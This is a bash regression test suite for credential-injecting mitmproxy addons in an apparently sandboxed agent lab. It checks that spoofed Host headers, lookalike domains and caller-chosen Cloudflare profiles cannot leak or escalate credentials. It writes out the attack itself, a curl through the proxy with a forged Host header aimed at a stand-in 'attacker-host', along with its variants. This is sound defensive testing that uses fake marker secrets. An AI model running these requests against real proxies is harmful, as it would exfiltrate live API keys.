#!/usr/bin/env bash
# Credential-injection addons (010_github, 020_anthropic, 030_cloudflare).
#
# These fetch a real secret from the broker and add it to the outbound request.
# The host check therefore decides who receives the credential, which makes it
# the highest-consequence branch in the whole stack: match too loosely and the
# proxy mails the key to whoever asked.
#
# REGRESSION under test: the addons matched flow.request.pretty_host, which
# prefers the client-supplied Host header while mitmproxy connects to
# flow.request.host. A lab container could therefore run
#
#   curl --proxy http://proxy:8080 -H 'Host: api.anthropic.com' http://my-server/
#
# and the addon would inject the Anthropic key into a request delivered to
# my-server. Verified against the real addon before the fix: it reached
# _get_cred() and only failed because the stub broker returns text, not JSON.
#
# A stub broker stands in for the real one and hands out obviously fake
# credentials, so a leak shows up as a marker string rather than a real key.
set -uo pipefail
. "$(dirname "${BASH_SOURCE[0]}")/../lib.sh"
cd "$REPO_ROOT"

require_docker
IMG="sat-test-proxy"
build_image "$IMG" stack/proxy || exit 1

MARKER="LEAKED-CREDENTIAL-MARKER"

# Echo server: reflects the request headers so a test can see exactly what the
# proxy sent, and to whom.
ECHO_CONF="$RUN_ID-echo.conf"
cat > "/tmp/$ECHO_CONF" <<EOF
server {
  listen 8080;
  location / {
    default_type text/plain;
    return 200 "RECEIVED-BY=\$host AUTH=\$http_authorization XAPIKEY=\$http_x_api_key TOKEN=\$http_authorization XCFPROFILE=[\$http_x_cf_profile]\n";
  }
}
EOF

# Broker stub: returns fake credentials in the shape each provider expects.
BROKER_CONF="$RUN_ID-broker.conf"
cat > "/tmp/$BROKER_CONF" <<EOF
server {
  listen 8080;
  default_type application/json;
  location = /github/token      { return 200 '{"token":"$MARKER"}'; }
  location = /anthropic/cred    { return 200 '{"type":"api_key","value":"$MARKER"}'; }
  location = /anthropic/key     { return 200 '{"key":"$MARKER"}'; }
  # Echoes the requested profile back inside the token, so the injected
  # Authorization header reveals which profile the addon actually asked for.
  location = /cloudflare/token  { return 200 '{"token":"$MARKER-\$arg_profile"}'; }
  # Echoes the requested service account back inside the token, the same trick
  # as cloudflare's profile: the injected Authorization then reveals which
  # identity the addon actually asked the broker for.
  location = /gcp/token         { return 200 '{"token":"$MARKER-\$arg_service_account"}'; }
  location / { return 404 '{"error":"no such provider route"}'; }
}
EOF

net_up
curl_up

BK="$RUN_ID-brokerstub"
docker run -d --name "$BK" --network "$NET" --network-alias broker \
  -v "/tmp/$BROKER_CONF:/etc/nginx/conf.d/default.conf:ro" nginx:alpine >/dev/null
track_container "$BK"

# The echo server answers to the vendor hostnames (so legitimate injection can
# be observed) and to `attacker-host` (the exfiltration target).
EC="$RUN_ID-echo"
docker run -d --name "$EC" --network "$NET" \
  --network-alias api.github.com --network-alias api.anthropic.com \
  --network-alias api.cloudflare.com --network-alias attacker-host \
  --network-alias storage.googleapis.com --network-alias sts.googleapis.com \
  --network-alias oauth2.googleapis.com --network-alias evilgoogleapis.com \
  --network-alias googleapis.com \
  -v "/tmp/$ECHO_CONF:/etc/nginx/conf.d/default.conf:ro" nginx:alpine >/dev/null
track_container "$EC"

wait_http "$BK:8080/github/token" 200 "broker stub"

run_proxy() { # run_proxy <name> <addon-file>...
  local name="$RUN_ID-$1"; shift
  local dir="/tmp/$name-addons"
  mkdir -p "$dir"
  cp stack/proxy/addons/000_policy.py "$dir/"
  local a; for a in "$@"; do cp "$a" "$dir/"; done
  # PROXY_ENV passes deployment configuration to the addon under test. Which
  # Cloudflare profile gets injected is exactly that — config on the proxy
  # service, not anything the caller can put in a request — so the suite below
  # needs to set it the way a real deployment would.
  docker run -d --name "$name" --network "$NET" -v "$dir:/addons:ro" \
    -e BROKER_URL=http://broker:8080 -e PYTHONUNBUFFERED=1 \
    ${PROXY_ENV:-} "$IMG" >/dev/null
  track_container "$name"
  local i
  for i in $(seq 1 60); do
    [ "$(http_code "http://attacker-host:8080/x" --proxy "http://$name:8080")" = "200" ] && return 0
    sleep 0.5
  done
  return 1
}

ADDONS=examples/claude-code/proxy
DC_ADDONS=examples/dev-container/.devcontainer/proxy

# ------------------------------------------------------------------ anthropic

suite "020_anthropic.py"
if run_proxy anthropic "$ADDONS/020_anthropic.py"; then
  P="--proxy http://$RUN_ID-anthropic:8080"

  body=$(http_body "http://api.anthropic.com:8080/v1/messages" $P)
  check_contains "credential injected for the real vendor host" "$body" "$MARKER"

  # The attack: real destination is attacker-host, Host header claims the vendor.
  body=$(http_body "http://attacker-host:8080/v1/messages" -H "Host: api.anthropic.com" $P)
  check_not_contains "spoofed Host does NOT leak the credential" "$body" "$MARKER"
  check_contains "request still reached the attacker host (no credential)" "$body" "RECEIVED-BY="

  body=$(http_body "http://attacker-host:8080/v1/messages" $P)
  check_not_contains "unrelated host gets no credential" "$body" "$MARKER"

  # Admin API stays blocked on the genuine host.
  check "Admin API blocked" "403" \
    "$(http_code "http://api.anthropic.com:8080/v1/organizations/api_keys" $P)"
  check "Admin API block cannot be dodged with a spoofed Host" "403" \
    "$(http_code "http://api.anthropic.com:8080/v1/organizations/api_keys" -H "Host: attacker-host" $P)"
else
  ko "anthropic proxy did not start" "$(docker logs "$RUN_ID-anthropic" 2>&1 | tail -20)"
fi

# --------------------------------------------------------------------- github

suite "010_github.py"
if run_proxy github "$ADDONS/010_github.py"; then
  P="--proxy http://$RUN_ID-github:8080"

  body=$(http_body "http://api.github.com:8080/rate_limit" $P)
  check_contains "token injected for api.github.com" "$body" "$MARKER"

  body=$(http_body "http://attacker-host:8080/rate_limit" -H "Host: api.github.com" $P)
  check_not_contains "spoofed Host does NOT leak the token" "$body" "$MARKER"

  # Documented invariant: github.com itself must not be matched — git push/pull
  # authenticates through the credential helper instead.
  body=$(http_body "http://attacker-host:8080/x" -H "Host: github.com" $P)
  check_not_contains "github.com is not a matched host" "$body" "$MARKER"
else
  ko "github proxy did not start" "$(docker logs "$RUN_ID-github" 2>&1 | tail -20)"
fi

# ----------------------------------------------------------------- cloudflare

suite "030_cloudflare.py"
if run_proxy cloudflare "$DC_ADDONS/030_cloudflare.py"; then
  P="--proxy http://$RUN_ID-cloudflare:8080"

  body=$(http_body "http://api.cloudflare.com:8080/client/v4/user" $P)
  check_contains "token injected for api.cloudflare.com" "$body" "$MARKER"

  body=$(http_body "http://attacker-host:8080/client/v4/user" -H "Host: api.cloudflare.com" $P)
  check_not_contains "spoofed Host does NOT leak the token" "$body" "$MARKER"

  # Unconfigured, the addon falls back to its shipped default.
  body=$(http_body "http://api.cloudflare.com:8080/client/v4/user" $P)
  check_contains "default profile is workers-deploy" "$body" "$MARKER-workers-deploy"
else
  ko "cloudflare proxy did not start" "$(docker logs "$RUN_ID-cloudflare" 2>&1 | tail -20)"
fi

suite "the lab container cannot choose its own Cloudflare profile"
# A permission ladder (dev / qa / prod-read / prod-ir) is decorative if the
# agent picks the rung. This deployment is configured for `dev`; the caller
# asks for `prod-ir` the way the pre-1.6.0 addon would have honoured.
PROXY_ENV="-e CLOUDFLARE_PROFILE=dev"
if run_proxy cloudflare-profile "$DC_ADDONS/030_cloudflare.py"; then
  P="--proxy http://$RUN_ID-cloudflare-profile:8080"

  body=$(http_body "http://api.cloudflare.com:8080/client/v4/user" $P)
  check_contains "configured profile is what gets injected" "$body" "$MARKER-dev"

  body=$(http_body "http://api.cloudflare.com:8080/client/v4/user" \
                   -H "X-Cf-Profile: prod-ir" $P)
  check_contains "a spoofed profile header still yields the configured profile" \
    "$body" "$MARKER-dev"
  check_not_contains "the requested profile is never minted" "$body" "prod-ir"
  # Stripped as well as ignored, so it cannot reach the vendor either.
  check_contains "the header does not survive to the destination" "$body" "XCFPROFILE=[]"
else
  ko "cloudflare-profile proxy did not start" \
     "$(docker logs "$RUN_ID-cloudflare-profile" 2>&1 | tail -20)"
fi
unset PROXY_ENV

# ------------------------------------------------------------------------ gcp

suite "gcp.py — a wildcard host family, matched on label boundaries"
# The first addon in the bank matching a wildcard rather than a fixed pair.
# *.googleapis.com is legitimate because Google holds every name beneath it —
# the single-tenant test from #39 — but a suffix match written by hand is
# exactly how evilexample.com slips through, so the boundaries are asserted
# here against the real addon and not only in hostmatch's unit tests.
PROXY_ENV="-e GCP_SERVICE_ACCOUNT=dev-agent@example.iam.gserviceaccount.com"
if run_proxy gcp bank/gcp/proxy/gcp.py; then
  P="--proxy http://$RUN_ID-gcp:8080"

  body=$(http_body "http://storage.googleapis.com:8080/storage/v1/b/x/o" $P)
  check_contains "token injected for a googleapis subdomain" "$body" "$MARKER"

  # The apex is not a subdomain. Nothing in the stack should be talking to it,
  # and the wildcard must not cover it.
  body=$(http_body "http://googleapis.com:8080/x" $P)
  check_not_contains "the apex does not match the wildcard" "$body" "$MARKER"

  # The whole point of the leading dot. A registrar-adjacent name that merely
  # ends in the same letters must not collect a live token.
  body=$(http_body "http://evilgoogleapis.com:8080/x" $P)
  check_not_contains "evilgoogleapis.com does not match" "$body" "$MARKER"

  # REGRESSION, the one every provider must carry: pretty_host prefers the
  # client-supplied Host header, so this is the shape that mailed the key to
  # whoever asked.
  body=$(http_body "http://attacker-host:8080/x" -H "Host: storage.googleapis.com" $P)
  check_not_contains "spoofed Host does NOT leak the token" "$body" "$MARKER"

  # Which identity is deployment configuration. The addon passes its own
  # configured value; the stub echoes back whatever it was asked for.
  body=$(http_body "http://storage.googleapis.com:8080/x" $P)
  # %40 not @: the addon passes the SA as a query param, so nginx echoes it
  # back percent-encoded. Asserting the encoded form keeps this checking what
  # crossed the wire rather than what we hoped it would look like.
  check_contains "the configured service account is what gets requested" \
    "$body" "$MARKER-dev-agent%40example.iam.gserviceaccount.com"

  # Whatever the client sent is replaced, not appended to.
  body=$(http_body "http://storage.googleapis.com:8080/x" \
                   -H "Authorization: Bearer CLIENT-OWN-TOKEN" $P)
  check_not_contains "client auth is stripped, not forwarded" "$body" "CLIENT-OWN-TOKEN"
  check_contains "and replaced with the injected token" "$body" "$MARKER"
else
  ko "gcp proxy did not start" "$(docker logs "$RUN_ID-gcp" 2>&1 | tail -20)"
fi

suite "gcp.py — the token exchange is answered, not forwarded"
# A client library will not call an API until its credential chain produces a
# token. The addon answers that exchange itself with the inert placeholder, so
# no exchange reaches Google and the value the client ends up holding is
# worthless anywhere else. If this ever starts returning the real token, the
# lab is holding a live GCP credential on the proxied path — which is a design
# change, not an optimisation.
if [ -n "${RUN_ID:-}" ] && docker inspect "$RUN_ID-gcp" >/dev/null 2>&1; then
  P="--proxy http://$RUN_ID-gcp:8080"

  body=$(http_body "http://sts.googleapis.com:8080/v1/token" -X POST $P)
  check_contains "the exchange returns an access_token" "$body" "access_token"
  check_contains "and it is the inert placeholder" "$body" "proxy-injected"
  check_not_contains "the real token is never handed to the client" "$body" "$MARKER"
  # Answered locally means the echo server never saw it.
  check_not_contains "the exchange never reached the destination" "$body" "RECEIVED-BY="

  # oauth2.googleapis.com is the other endpoint the chain can end at.
  body=$(http_body "http://oauth2.googleapis.com:8080/token" -X POST $P)
  check_contains "oauth2 token endpoint is answered too" "$body" "proxy-injected"

  # A non-token path on a token host is an ordinary API call and must be
  # injected into rather than answered.
  body=$(http_body "http://sts.googleapis.com:8080/v1/something-else" $P)
  check_contains "a non-token path on the same host is injected, not answered" \
    "$body" "$MARKER"

  # /tokeninfo starts with /token. A prefix test would answer it with the
  # inert placeholder, so a caller asking "what is this credential" would be
  # told about the wrong one — wrongly, and silently.
  body=$(http_body "http://oauth2.googleapis.com:8080/tokeninfo" $P)
  check_contains "/tokeninfo is an API, not the token endpoint" "$body" "$MARKER"
  check_not_contains "and is not answered locally" "$body" "proxy-injected"
else
  ko "gcp proxy unavailable for the token-exchange suite" ""
fi
unset PROXY_ENV

# ------------------------------------------------------ broker unreachable

suite "client auth is stripped even when the broker is unreachable"
# REGRESSION: stripping the client's header and injecting ours were the same
# statement in 010_github/030_cloudflare, and in 020_anthropic the fetch ran
# ahead of the strip loop. Either way the broker fetch raises first, so the
# strip never happened and the agent's own Authorization/x-api-key was
# forwarded to the vendor untouched — while the addon's comment said it was
# stripped. Verified against the real addons before the fix: the echo server
# received `token CLIENT-OWN-TOKEN-abc123` verbatim.
#
# Not a credential leak (nothing of ours escapes), but the stack states that
# the proxy replaces whatever the client sent, and under broker failure that
# did not hold. Fix is ordering: strip unconditionally, then fetch.
#
# Must run last and needs its own proxy. The addons cache for 5 minutes, so a
# proxy that already injected successfully would serve from cache and never
# touch the broker — the failure path would go untested.
docker kill "$BK" >/dev/null 2>&1
if run_proxy nobroker "$ADDONS/010_github.py" "$ADDONS/020_anthropic.py" \
                      "$DC_ADDONS/030_cloudflare.py"; then
  P="--proxy http://$RUN_ID-nobroker:8080"

  body=$(http_body "http://api.github.com:8080/rate_limit" \
    -H "Authorization: token CLIENT-OWN-TOKEN" $P)
  check_not_contains "github: client Authorization does not reach the vendor" \
    "$body" "CLIENT-OWN-TOKEN"

  body=$(http_body "http://api.anthropic.com:8080/v1/messages" \
    -H "x-api-key: CLIENT-OWN-KEY" $P)
  check_not_contains "anthropic: client x-api-key does not reach the vendor" \
    "$body" "CLIENT-OWN-KEY"

  body=$(http_body "http://api.anthropic.com:8080/v1/messages" \
    -H "Authorization: Bearer CLIENT-OWN-BEARER" $P)
  check_not_contains "anthropic: client Authorization does not reach the vendor" \
    "$body" "CLIENT-OWN-BEARER"

  body=$(http_body "http://api.cloudflare.com:8080/client/v4/user" \
    -H "Authorization: Bearer CLIENT-OWN-CF-TOKEN" $P)
  check_not_contains "cloudflare: client Authorization does not reach the vendor" \
    "$body" "CLIENT-OWN-CF-TOKEN"

  # The request still goes through unauthenticated — this fix does not change
  # the fail mode, only what the vendor receives. injection.fail_mode is a
  # separate design question (see ROADMAP item 4).
  check_contains "request still reaches the vendor, without auth" "$body" "RECEIVED-BY="
else
  ko "no-broker proxy did not start" "$(docker logs "$RUN_ID-nobroker" 2>&1 | tail -20)"
fi

rm -f "/tmp/$ECHO_CONF" "/tmp/$BROKER_CONF"
rm -rf "/tmp/$RUN_ID"-*-addons

# --------------------------------------------------------------- #87
#
# mitmproxy calls every addon's request hook whether or not the flow has
# already been answered. Before the guard, an injection addon running after a
# denial fetched a credential from the broker and logged cred_injected for a
# request that never left — the audit trail claiming a credential was spent on
# a request the proxy refused.
#
# The allowlist is the addon that denies here, since it is the one that can
# refuse a host an injection addon also matches.
suite "an injection addon stands aside once a request has been refused"
GUARD_DIR="/tmp/$RUN_ID-guard-addons"
mkdir -p "$GUARD_DIR"
cp stack/proxy/addons/000_policy.py stack/proxy/addons/001_allowlist.py "$GUARD_DIR/"
cp bank/anthropic/proxy/anthropic.py "$GUARD_DIR/020_anthropic.py"
# An enforcing allowlist that does NOT list api.anthropic.com.
printf 'readonly-api\n' > "/tmp/$RUN_ID-guard-allowlist"

PXG="$RUN_ID-guard"
docker run -d --name "$PXG" --network "$NET" \
  -v "$GUARD_DIR:/addons:ro" \
  -v "/tmp/$RUN_ID-guard-allowlist:/etc/agent-allowlist:ro" \
  -e BROKER_URL=http://broker:8080 -e PYTHONUNBUFFERED=1 \
  -e AUDIT_LOG=/tmp/audit.jsonl "$IMG" >/dev/null
track_container "$PXG"

guard_ready=false
for _ in $(seq 1 60); do
  code=$(http_code "http://readonly-api:8080/ping" --proxy "http://$PXG:8080")
  [ -n "$code" ] && [ "$code" != "000" ] && { guard_ready=true; break; }
  sleep 0.5
done

if [ "$guard_ready" != true ]; then
  ko "guard proxy did not start" "$(docker logs "$PXG" 2>&1 | tail -20)"
else
  check "an unlisted host is refused" "403" \
    "$(http_code "http://api.anthropic.com/v1/messages" -X POST --proxy "http://$PXG:8080")"
  trail=$(docker exec "$PXG" cat /tmp/audit.jsonl 2>/dev/null)
  # Matched without the key, because the two audit writers disagree on spacing:
  # audit.js emits compact JSON and audit.py does not, so `"event":"blocked"`
  # and `"event": "blocked"` both occur in a real trail. A check written for
  # one silently misses the other.
  check_contains "the denial is recorded" "$trail" '"blocked"'
  check_not_contains "and no credential injection is claimed" "$trail" "cred_injected"
fi

finish
